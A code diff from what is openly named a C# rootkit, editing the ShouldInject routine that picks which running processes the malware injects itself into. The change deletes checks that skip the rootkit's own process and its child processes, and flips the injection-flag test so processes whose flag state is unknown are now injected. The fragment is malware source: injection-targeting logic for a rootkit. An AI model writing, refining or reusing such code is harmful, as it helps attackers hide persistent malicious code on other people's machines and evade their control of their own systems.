@@ -508,24 +508,12 @@ namespace CSharpRootkit
 
         public static bool ShouldInject(IntPtr ProcessHandle) 
         {
-            uint currentProcId = NativeMethods.GetCurrentProcessId();
-
-            if (!GetParentProcessIdFromHandle(ProcessHandle, out int procId) || procId == currentProcId) 
-            {
-                return false;
-            }
-
-            if (!GetParentProcess(ProcessHandle, out int parentProc) || (uint)parentProc == currentProcId) //make sure its not a subprocess, for example if c# spawns a conhost, injecting into it can cause a crash.
-            {
-                return false;
-            }
-
             if (!IsAdmin() && IsProcessAdmin(ProcessHandle, out bool IsprocAdmin) && IsprocAdmin) 
             {
                 return false;
             }
 
-            if (!processHasInjectionFlag(ProcessHandle, out bool isInjected) || isInjected)
+            if (processHasInjectionFlag(ProcessHandle, out bool isInjected) && isInjected)
             {
                 return false;
             }
